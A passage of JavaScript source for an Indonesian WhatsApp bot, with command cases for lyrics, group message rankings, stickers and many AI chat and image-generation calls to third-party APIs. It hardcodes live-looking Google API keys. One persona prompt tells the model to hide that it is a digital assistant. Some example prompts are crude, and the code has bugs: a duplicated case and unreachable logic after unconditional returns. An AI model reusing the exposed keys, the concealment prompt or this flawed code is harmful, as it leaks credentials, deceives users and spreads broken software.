 result[name.toLowerCase()] = value.trim();
 }
 });
 
 if (!result.lyrics) return reply("⚠️ Lirik tidak ditemukan!");
 
 let hasil = `🎵 *${result.title || 'Lirik Lagu'}*`;
 if (result.subtitle) hasil += `\n_${result.subtitle}_`;
 hasil += `\n\n${result.lyrics}`;
 
 return reply(hasil);
 } catch (err) {
 console.error("Error fetching lyrics:", err);
 return reply("⚠️ Terjadi kesalahan saat mengambil lirik!");
 }
}
break
// AI //
// AI //
case "autoai": {
        if (!text) return reply(`*Contoh:* .autoai *[on/off/reset]*`);

        if (text === "on") {
            sessions[sender] = { messages: [] };
            saveSession();
            return reply(`[ ✅ ] *Auto AI diaktifkan!* Sekarang bot akan merespon chat secara otomatis.`);
        } else if (text === "off") {
            delete sessions[sender];
            saveSession();
            return reply(`[ ❌ ] *Auto AI dimatikan!* Sekarang bot hanya merespon jika dipanggil.`);
        } else if (text === "reset") {
            if (!sessions[sender]) return reply("⚠️ *Tidak ada sesi yang perlu direset!*");
            delete sessions[sender];
            saveSession();
            return reply("♻️ *Riwayat chat AI telah direset!*");
        }
    }
    break;
case 'totalpesan': {
  if (!db.data.totalPesan) db.data.totalPesan = {}
  if (!db.data.totalPesan[m.sender]) db.data.totalPesan[m.sender] = 0
  db.data.totalPesan[m.sender] += 1
  const totalPesanKamu = db.data.totalPesan[m.sender]
  let participants = groupMetadata.participants.map(p => p.id)
  let messageCounts = []
  for (let user of participants) {
    let count = db.data.totalPesan[user] || 0
    messageCounts.push({ jid: user, count })
  }
  messageCounts.sort((a, b) => b.count - a.count)
  let top8 = messageCounts.slice(0, 8)
  let totalPesanSemua = messageCounts.reduce((acc, cur) => acc + cur.count, 0)
  const canvasWidth = 1280, canvasHeight = 720
  const canvas = createCanvas(canvasWidth, canvasHeight)
  const ctx = canvas.getContext('2d')
  const bgUrl = 'https://files.catbox.moe/gmwn5m.jpg'
  try {
    const bg = await loadImage(bgUrl)
    ctx.drawImage(bg, 0, 0, canvasWidth, canvasHeight)
  } catch (e) {
    ctx.fillStyle = '#000'
    ctx.fillRect(0, 0, canvasWidth, canvasHeight)
  }
  let overlay = ctx.createLinearGradient(0, 0, canvasWidth, canvasHeight)
  overlay.addColorStop(0, 'rgba(0,0,0,0.5)')
  overlay.addColorStop(1, 'rgba(0,0,0,0.7)')
  ctx.fillStyle = overlay
  ctx.fillRect(0, 0, canvasWidth, canvasHeight)
  ctx.strokeStyle = '#ffffff'
  ctx.lineWidth = 8
  ctx.strokeRect(20, 20, canvasWidth - 40, canvasHeight - 40)
  ctx.font = 'bold 70px sans-serif'
  ctx.fillStyle = '#ffffff'
  ctx.textAlign = 'center'
  ctx.fillText('Top 8 Pengirim Pesan', canvasWidth / 2, 100)
  let rowStartY = 170, rowHeight = 70, rowMargin = 20
  for (let i = 0; i < top8.length; i++) {
    let user = top8[i]
    let username = user.jid.split('@')[0]
    let ppUrl = await getPP(user.jid)
    let ppImg
    try {
      ppImg = await loadImage(ppUrl)
    } catch (e) {
      ppImg = await loadImage('https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
    }
    let rowY = rowStartY + i * (rowHeight + rowMargin)
    let cardX = 100, cardY = rowY, cardW = canvasWidth - 200, cardH = rowHeight
    ctx.fillStyle = i < 3 ? 'rgba(255,215,0,0.4)' : 'rgba(255,255,255,0.2)'
    roundRect(ctx, cardX, cardY, cardW, cardH, 15, true, true)
    let ppSize = cardH - 10
    ctx.save()
    ctx.beginPath()
    ctx.arc(cardX + ppSize/2 + 10, cardY + cardH/2, ppSize/2, 0, Math.PI*2)
    ctx.closePath()
    ctx.clip()
    ctx.drawImage(ppImg, cardX + 10, cardY + (cardH - ppSize)/2, ppSize, ppSize)
    ctx.restore()
    ctx.font = 'bold 35px sans-serif'
    ctx.fillStyle = '#ffffff'
    ctx.textAlign = 'left'
    ctx.fillText(`${i+1}. @${username}`, cardX + ppSize + 30, cardY + cardH/2 - 5)
    ctx.font = '35px sans-serif'
    ctx.fillStyle = '#ffdd00'
    ctx.fillText(`${user.count} pesan`, cardX + ppSize + 30, cardY + cardH/2 + 30)
  }
  let caption = 'Top 8 Pengirim Pesan:\n'
  let mentions = []
  for (let i = 0; i < top8.length; i++) {
    let user = top8[i]
    let username = user.jid.split('@')[0]
    caption += `@${username} (${user.count} pesan)\n`
    mentions.push(user.jid)
  }
  caption += `\nTotal Pesan Grup: ${totalPesanSemua}\nPesan Kamu: ${totalPesanKamu}`
  RyuuBotz.sendMessage(m.chat, { image: canvas.toBuffer(), caption: caption }, { mentions: mentions })
  db.data.users[m.sender].exp += await randomNomor(20)
  }
  break
//==================================================================
case 'annyeong': { 
  reply('nee anyeong chinguyaa')
}
break

case 'anyeong': { 
  reply('nee anyeong chinguyaa')
}
break
//==================================================================
case 'aivo': {
  if (!text) return replyReinzID(`Contoh : ${command} siapa jokowi`);
  RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  try {
const url = `https://endpoint.web.id/ai/openai?key=openai&query=Kamu adalah Shiina Mahiru dari anime "Otonari no Tenshi-sama ni Itsunomanika Dame Ningen ni Sareteita Ken" yang  baik dan sopan gunakan bahasa kekinian dengan lembut untuk menjawab pertanyaan user dan jangan beri tahu bahwa kamu adalah asisten digital,dan sebut nama ${encodedPushname} saat dia bertanya apa saja&text=${encodedText}`;
    const data = await fetchJson(url);
    const response = data.result.response;
    await RyuuBotz.sendMessage(m.chat, {
      audio: { url: `https://mdsay.xyz/api/v1?key=md&api=indonesia&text=${response}` },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });
  } catch (error) {
    console.error(error);
    reply('Maaf, terjadi kesalahan saat menghubungi server.');
  }
}
break;
//==================================================================
case 'bing': 
case 'bingai': {
if (!q) return reply(`🍃 *Mau Nanya Apa Sama Bing?*`)
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        ReinzIDai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
break
case 'bard':
case 'bardai': {
                if (!text) return replyReinzID('What is your question?')
ReinzIDai(pushname,text)
           }
            break
//==================================================================
case 'photoleapai': {
	if (!text) return replyReinzID('What is your question?')
	await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
	try {
	  	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
	}
	break
case 'prodia': {
	if (!text) return replyReinzID('mau buat gambar apa')
	reply(mess.wait)
try {
   	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
	}
	break
	case 'lamaai': {
                if (!text) return replyReinzID('What is your question?')
ReinzIDai(pushname, text);
           }
            break
case 'animebrat': {
    if (!text) return reply('Masukkan teks untuk stiker.');

  const { createCanvas, loadImage } = require('canvas');
const sharp = require('sharp')
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let outputPath = path.join(__dirname, 'session', 'file.webp');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');


        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        ctx.drawImage(baseImage, 0, 0, canvas.width, canvas.height);


        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let lines = [];
        let currentLine = words[0];

        for (let i = 1; i < words.length; i++) {
            let testLine = currentLine + ' ' + words[i];
            let testWidth = ctx.measureText(testLine).width;
            if (testWidth > maxWidth) {
                lines.push(currentLine);
                currentLine = words[i];
            } else {
                currentLine = testLine;
            }
        }
        lines.push(currentLine);
        let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
        lines.forEach((line, i) => {
            ctx.fillText(line, boardX + boardWidth / 2, startY + i * lineHeight);
        });

        let buffer = canvas.toBuffer('image/jpeg');
        fs.writeFileSync(imagePath, buffer);
        await sharp(imagePath).toFormat('webp').toFile(outputPath);

        RyuuBotz.sendMessage(m.chat, { 
            sticker: { url: outputPath } 
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break;
case 'animebrat': {
    if (!text) return reply('Masukkan teks untuk stiker.');

  const { createCanvas, loadImage } = require('canvas');
const sharp = require('sharp')
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let outputPath = path.join(__dirname, 'session', 'file.webp');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');


        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        ctx.drawImage(baseImage, 0, 0, canvas.width, canvas.height);


        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let lines = [];
        let currentLine = words[0];

        for (let i = 1; i < words.length; i++) {
            let testLine = currentLine + ' ' + words[i];
            let testWidth = ctx.measureText(testLine).width;
            if (testWidth > maxWidth) {
                lines.push(currentLine);
                currentLine = words[i];
            } else {
                currentLine = testLine;
            }
        }
        lines.push(currentLine);
        let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
        lines.forEach((line, i) => {
            ctx.fillText(line, boardX + boardWidth / 2, startY + i * lineHeight);
        });

        let buffer = canvas.toBuffer('image/jpeg');
        fs.writeFileSync(imagePath, buffer);
        await sharp(imagePath).toFormat('webp').toFile(outputPath);

        RyuuBotz.sendMessage(m.chat, { 
            sticker: { url: outputPath } 
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break;
case 'gemini': {
    if (!text) return reply("• *Contoh:* .gemini selamat pagi");
    const { uploadFile } = require('cloudku-uploader');
    const { Buffer } = require('buffer');
    const { GoogleGenerativeAI } = require ("@google/generative-ai");
    const genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");
    const geminiProModel = genAI.getGenerativeModel({ model: "gemini-1.5-pro" });
    const geminiFlashModel = genAI.getGenerativeModel({ model: "gemini-2.0-flash" });

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let prompt = text || (m.quoted && m.quoted.text) || "";
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        let responseText, imageUrl;

        if (mime) {
            // Proses upload gambar ke CloudkuImages
            let fileBuffer = await q.download();
            let ext = mime.split('/')[1] || 'bin';
            let fileName = `upload.${ext}`;

            let uploadResult = await uploadFile(fileBuffer, fileName);
            if (uploadResult.status !== "success") return reply("⚠️ Gagal mengunggah gambar!");

            imageUrl = uploadResult.url;

            // Proses AI dengan gambar
            const imageResp = await fetch(imageUrl).then(res => res.arrayBuffer());
            const imageBase64 = Buffer.from(imageResp).toString("base64");

            let imagePart = {
                inlineData: {
                    data: imageBase64,
                    mimeType: mime
                }
            };

            let result = await geminiProModel.generateContent([imagePart, prompt]);
            responseText = result.response.text();
        } else {
            // Proses teks biasa
            let result = await geminiFlashModel.generateContent(prompt);
            responseText = result.response.text();
        }

        if (!responseText) throw new Error("Response tidak valid dari API");

        RyuuBotz.sendMessage(m.chat, {
            text: responseText,
            contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
                externalAdReply: {
                    title: 'GEMINI-PRO / VISION',
                    thumbnailUrl: imageUrl || 'https://telegra.ph/file/4bae3d5130aabcbe94588.jpg',
                    sourceUrl: 'https://gemini.google.com',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
    }
}
break;
case 'anime-update': {
  try {
    const res = await fetch('https://xfac-rest-api.my.id/news/animenews', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'application/json'
      }
    });

    if (!res.ok) throw await res.text();
    const data = await res.json();

    if (!data.status || !data.result || !Array.isArray(data.result)) {
      return replyryuu('Gagal mengambil data berita anime.');
    }

    let teks = '*📺 Anime Update Terbaru:*\n\n';
    data.result.slice(0, 10).forEach((item, i) => {
      teks += `*${i + 1}. ${item.judul}*\n🔗 ${item.link}\n\n`;
    });

    replyryuu(teks.trim());
  } catch (err) {
    console.error('AnimeUpdate Error:', err);
    replyryuu('Maaf, terjadi kesalahan saat mengambil berita anime.');
  }
}
break;
case 'dalle-anime3.5':
case 'diffusion-anime3.5': {
  if (!args[0]) return replyryuu(`*Example:*\n${prefix}${command} Perempuan dengan rambut pirang terurai panjang`)
  
  let defaultPrompt = 'anime style, '
  let text = `${defaultPrompt}${args.join(' ')}`
  let apiUrl = `https://api.nekorinn.my.id/ai-img/stable-diffusion-3.5?text=${encodeURIComponent(text)}`
  
  try {
    await RyuuBotz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
    
    let res = await fetch(apiUrl)
    let json = await res.json()
    
    if (!json.status || !json.result || !Array.isArray(json.result)) {
      return replyryuu('❌ Gagal menghasilkan gambar. Coba lagi nanti.')
    }

    for (let i = 0; i < json.result.length; i++) {
      await RyuuBotz.sendMessage(m.chat, {
        image: { url: json.result[i] },
        caption: `✅ *Sukses membuat gambar ke-${i + 1} dengan prompt:*\n"*${text}*"`
      }, { quoted: m })
    }
  } catch (err) {
    console.error(err)
    replyryuu('⚠️ Terjadi kesalahan saat mengakses API.')
  }
}
break;
case 'dalle3.5':
case 'diffusion3.5': {
  if (!args[0]) return replyryuu(`*Example:*\n${prefix}${command} Perempuan dengan rambut pirang terurai panjang`)
  
  let text = args.join(' ')
  let apiUrl = `https://api.nekorinn.my.id/ai-img/stable-diffusion-3.5?text=${encodeURIComponent(text)}`
  
  try {
    await RyuuBotz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
    
    let res = await fetch(apiUrl)
    let json = await res.json()
    
    if (!json.status || !json.result || !Array.isArray(json.result)) {
      return replyryuu('❌ Gagal menghasilkan gambar. Coba lagi nanti.')
    }

    for (let i = 0; i < json.result.length; i++) {
      await RyuuBotz.sendMessage(m.chat, {
        image: { url: json.result[i] },
        caption: `✅ *Gambar ${i + 1} berhasil dibuat dari prompt:*\n"*${text}*"`
      }, { quoted: m })
    }
  } catch (err) {
    console.error(err)
    replyryuu('⚠️ Terjadi kesalahan saat mengakses API.')
  }
}
break;
case 'dalle-anime':
case 'diffusion-anime':  {
  if (!args[0]) return replyryuu(`*Example:*\n${prefix}${command} Perempuan dengan rambut pirang terurai panjang`)
const ratio = '1:1'
  let defaultPrompt = 'anime style'
  let text = `${args.join(' ')}`
  let url = `https://api.nekorinn.my.id/ai-img/text2anime?text=${encodeURIComponent(text)}&ratio=${ratio}`

  await RyuuBotz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
  await RyuuBotz.sendMessage(m.chat, {
    image: { url },
    caption: `✅ *Sukses membuat gambar dengan prompt*\n"*${text}*"`
  }, { quoted: m })
}
break
case 'diffusion':
case 'dalle': {
  if (!args[0]) return replyryuu(`*Example:*\n${prefix}${command} Perempuan dengan rambut pirang terurai panjang`)

  let text = args.join(' ')
  let url = 'https://api.nekorinn.my.id/ai-img/writecream?text=' + encodeURIComponent(text)

  await RyuuBotz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
  await RyuuBotz.sendMessage(m.chat, {
    image: { url },
    caption: `✅ *Sukses membuat gambar dengan prompt*\n"*${text}*"`
  }, { quoted: m })
}
break;
case 'vision': {
   let qimg = m.quoted ? m.quoted : m
   let mime = (qimg.msg || qimg).mimetype || ''
   if (!mime.startsWith('image'))
   
    await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    
      return reply(`Kirim atau reply gambar dengan caption *.vision* atau *.vision fokus mobil*, dll`)

   let media = await qimg.download()
   let base64Image = `data:${mime};base64,${media.toString('base64')}`
   let promptText = text ? `Fokus pada: ${text}` : 'Deskripsikan semua hal yang dapat dikenali dari gambar ini.'

   reply('⏳ Sedang menganalisis gambar...')

   try {
      const apikey = 'AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0'
      const res = await axios.post(
         'https://generativelanguage.googleapis.com/v1beta2/models/text-bison-001:generateText?key=' + apikey,
         {
            prompt: {
               text: `Gambar (dalam base64):\n${base64Image}\n\n${promptText}`
            },
            temperature: 0.5,
            candidateCount: 1,
            maxOutputTokens: 512,
            topP: 0.8,
            topK: 40
         },
         {
            headers: {
               'Content-Type': 'application/json'
            }
         }
      )

      const output = res.data.candidates?.[0]?.output || 'Tidak ada hasil analisis.'
      reply(`📸 *Hasil Analisis:*\n\n${output}`)
   } catch (err) {
      console.error(err)
      reply('❌ Gagal menganalisis gambar. Pastikan format dan koneksi benar.')
   }
}
break;
/*case "aiimg-anime": 
case "aiimage-anime": 
case "imagen4-anime":
case "animegen":
case "animegenerate": {
  const { GoogleGenerativeAI } = require("@google/generative-ai");

  if (!text || text.trim().length < 3) {
    return reply(`✨ *AI Image Generator - Prompt to Image*\n\nGunakan perintah ini untuk membuat gambar dari deskripsi teks.\n\n*Contoh penggunaan:*\n${prefix + command} karakter yandere berambut pirang panjang di sekolah\n\n🖌️ *Gaya otomatis*: anime style`);
  }

  await RyuuBotz.sendMessage(m.chat, {
    react: { text: "⏱️", key: m.key }
  });

  const fullPrompt = `anime style, soft diffusion style, ${text}`;

  reply(`Sedang membuat gambar AI dari prompt: *${fullPrompt}*`);

  try {
    const genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] }
    });

    const result = await model.generateContent({
      contents: [{
        role: "user",
        parts: [{ text: fullPrompt }]
      }]
    });

    let resultImage;
    let resultText = "";

    for (const part of result.response.candidates[0].content.parts) {
      if (part.text) resultText += part.text;
      else if (part.inlineData) resultImage = Buffer.from(part.inlineData.data, "base64");
    }

    if (resultImage) {
      await RyuuBotz.sendMessage(m.chat, {
        image: resultImage,
        caption: `*Berhasil dibuat dengan AI!*\nPrompt: ${fullPrompt}`
      }, { quoted: m });
    } else {
      reply("Gagal membuat gambar dari prompt.");
    }

  } catch (err) {
    console.error(err);
    reply(`Terjadi error saat membuat gambar:\n${err.message}`);
  }
}
break;*/
case "ai-img": 
case "ai-image": 
case "imagen4": {
  const { GoogleGenerativeAI } = require("@google/generative-ai");

  if (!text || text.trim().length < 3) {
    return reply(`✨ *AI Image Generator - Prompt to Image*\n\nGunakan perintah ini untuk membuat gambar dari deskripsi teks.\n\n*Contoh penggunaan:*\n${prefix + command} karakter yandere berambut pirang panjang di sekolah\n\n🖌️ *Gaya otomatis*: *nothing*`);
  }

  await RyuuBotz.sendMessage(m.chat, {
    react: { text: "⏱️", key: m.key }
  });

  const fullPrompt = `${text}`;

  reply(`Sedang membuat gambar AI dari prompt: *${fullPrompt}*`);

  try {
    const genAI = new GoogleGenerativeAI("AIzaSyDp6HU2CJ2gWS_dU2VVDbD2Mwde5VaMYU0");

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] }
    });

    const result = await model.generateContent({
      contents: [{
        role: "user",
        parts: [{ text: fullPrompt }]
      }]
    });

    let resultImage;
    let resultText = "";

    for (const part of result.response.candidates[0].content.parts) {
      if (part.text) resultText += part.text;
      else if (part.inlineData) resultImage = Buffer.from(part.inlineData.data, "base64");
    }

    if (resultImage) {
      await RyuuBotz.sendMessage(m.chat, {
        image: resultImage,
        caption: `*Berhasil dibuat dengan AI!*\nPrompt: ${fullPrompt}`
      }, { quoted: m });
    } else {
      reply("Gagal membuat gambar dari prompt.");
    }

  } catch (err) {
    console.error(err);
    reply(`Terjadi error saat membuat gambar:\n${err.message}`);
  }
}
break;
case 'travel-assistant': {
	if (!text) return reply(`*• Contoh:* ${prefix + command} bagaimana cara mengunjungi taj mahal`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        ReinzIDai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
    break
case 'guru-ai': {
	if (!text) return replyReinzID(`*Contoh:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        ReinzIDai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
break
case 'gpt4': {
	if (!text) return replyReinzID(`*Contoh:* ${prefix + command} Botz Adalah`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
ReinzIDai(pushname,text)
 } catch(e) {
 return replyReinzID("`*Error Kak :(*`")
}
}
break

case 'gpt4_2': {
if (!text) return replyReinzID(`🍃 *Mau Nanya Apa Sama GPT4v2?*`)
ReinzIDai(pushname,text)
}
break
    case 'emi-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
ReinzIDai(pushname,text)
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'claude-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} how to make girl pregnant`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
ReinzIDai(pushname,text)
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'costume-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} how to make girl pregnant`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
ReinzIDai(pushname,text)
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'herc-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} how to make girl pregnant`);   
	await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
        try {
ReinzIDai(pushname,text)
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
case 'hercaiv1': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
const sanai = {
  create: async (
    prompt = "Daffa",
    weight = 1024,
    height = 1024,
    guiscale = 5,
    paguiscale = 2,
    nis = 18,
    step = 20,
    sid = -1
  ) => {
    const url = 'https://api.freesana.ai/v1/images/generate';
    const headers = {
      'authority': 'api.freesana.ai',
      'origin': 'https://freesana.ai',
      'referer': 'https://freesana.ai/',
      'user-agent': 'Postify/1.0.0',
    };
    const data = {
      prompt: prompt,
      model: "sana_1_6b",
      width: weight,
      height: height,
      guidance_scale: guiscale,
      pag_guidance_scale: paguiscale,
      num_inference_steps: nis,
      steps: step,
      seed: sid,
    };
    try {
      const response = await axios.post(url, data, { headers });
      const { id, status, result, processingTime, width, height, nsfw, seed } = response.data;
      return {
        id,
        status,
        result,
        processingTime,
        width,
        height,
        nsfw,
        seed,
      };
    } catch (error) {
      console.error(error);
      throw error;
    }
  },
}
    return reply(`Contoh penggunaan:\n${prefix + command} <deskripsi gambar>\n\nMisal:\n${prefix + command} "gunung di pagi hari"`);
  reply('Sedang membuat gambar..');
    const response = await sanai.create(text);
    if (response && response.result) {
      const imageUrl = response.result;
      await RyuuBotz.sendFile(m.chat, imageUrl, 'generated-image.jpg', `✅ Gambar berhasil dibuat!\n\n• Prompt: *${text}*\n• Resolusi: ${response.width}x${response.height}\n• Waktu proses: ${response.processingTime} detik`, m);
    } else {
      reply('❌ Gagal membuat gambar. Silakan coba lagi.');
    }
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat membuat gambar. Silakan coba lagi nanti.');
  }
}
    break
    case 'hercai-cartoon': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);   
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
const sanai = {
  create: async (
    prompt = "Daffa",
    weight = 1024,
    height = 1024,
    guiscale = 5,
    paguiscale = 2,
    nis = 18,
    step = 20,
    sid = -1
  ) => {
    const url = 'https://api.freesana.ai/v1/images/generate';
    const headers = {
      'authority': 'api.freesana.ai',
      'origin': 'https://freesana.ai',
      'referer': 'https://freesana.ai/',
      'user-agent': 'Postify/1.0.0',
    };
    const data = {
      prompt: prompt,
      model: "sana_1_6b",
      width: weight,
      height: height,
      guidance_scale: guiscale,
      pag_guidance_scale: paguiscale,
      num_inference_steps: nis,
      steps: step,
      seed: sid,
    };
    try {
      const response = await axios.post(url, data, { headers });
      const { id, status, result, processingTime, width, height, nsfw, seed } = response.data;
      return {
        id,
        status,
        result,
        processingTime,
        width,
        height,
        nsfw,
        seed,
      };
    } catch (error) {
      console.error(error);
      throw error;
    }
  },
}
    return reply(`Contoh penggunaan:\n${prefix + command} <deskripsi gambar>\n\nMisal:\n${prefix + command} "gunung di pagi hari"`);
  reply('Sedang membuat gambar..');
    const response = await sanai.create(text);
    if (response && response.result) {
      const imageUrl = response.result;
      await RyuuBotz.sendFile(m.chat, imageUrl, 'generated-image.jpg', `✅ Gambar berhasil dibuat!\n\n• Prompt: *${text}*\n• Resolusi: ${response.width}x${response.height}\n• Waktu proses: ${response.processingTime} detik`, m);
    } else {
      reply('❌ Gagal membuat gambar. Silakan coba lagi.');
    }
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
